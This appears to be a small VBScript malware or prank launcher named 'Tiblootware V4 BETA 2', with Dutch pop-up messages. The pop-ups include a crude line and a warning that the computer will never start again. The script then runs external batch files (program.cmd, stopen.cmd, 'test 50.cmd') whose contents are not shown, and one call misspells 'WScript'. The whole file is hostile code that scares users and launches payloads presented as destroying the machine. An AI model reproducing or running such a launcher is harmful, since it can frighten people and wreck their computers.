x=msgbox("NEE!" ,32+0, "Tiblootware V4 BETA 2")
x=msgbox("Deze computer is volledig verkracht" ,0, "Tiblootware V4 BETA 2")
x=msgbox("tijd om dag te zeggen" ,0, "Tiblootware V4 BETA 2")
Dim objshell
Set objshell = Wscript.CreateObject("WScript.Shell")
objshell.run "cmd /c if exist program.cmd (echo je hebt nog 10 seconden && echo en dan zal de computer nooit meer opstarten && pause) else  (echo no file found && pause)"
CreateObject("WScript.Shell").Run "program.cmd"
CreateObject("WScript.Shell").Run "stopen.cmd"
CreateObject("WScript.Shell").Run "test 50.cmd"
CreateObject("Wcript.shell").run "stopen.cmd"
